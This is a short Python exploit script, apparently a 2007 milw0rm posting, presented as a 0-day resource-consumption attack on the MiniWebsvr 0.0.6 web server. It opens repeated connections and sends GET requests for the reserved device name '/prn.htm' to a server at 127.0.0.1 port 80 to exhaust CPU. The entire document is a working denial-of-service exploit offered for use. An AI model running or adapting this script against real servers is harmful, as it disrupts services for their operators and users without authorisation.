import socket

print
"-----------------------------------------------------------------------"
print "MiniWebsvr 0.0.6 (0-Day) Resource Consumption"
print "url: http://miniwebsvr.sourceforge.net/"
print "author: shinnai"
print "mail: shinnai[at]autistici[dot]org"
print "site: http://shinnai.altervista.org"
print "Run this exploit and take a look to the CPU usage."
print
"-----------------------------------------------------------------------"

host = "127.0.0.1"
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   for i in range (0,3):
       request =  "GET /prn.htm HTTP/1.1 \n\n"
       connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connection.connect((host, port))
       connection.send(request)
       print i
except:
   print "Unable to connect. exiting."

# milw0rm.com [2007-02-13]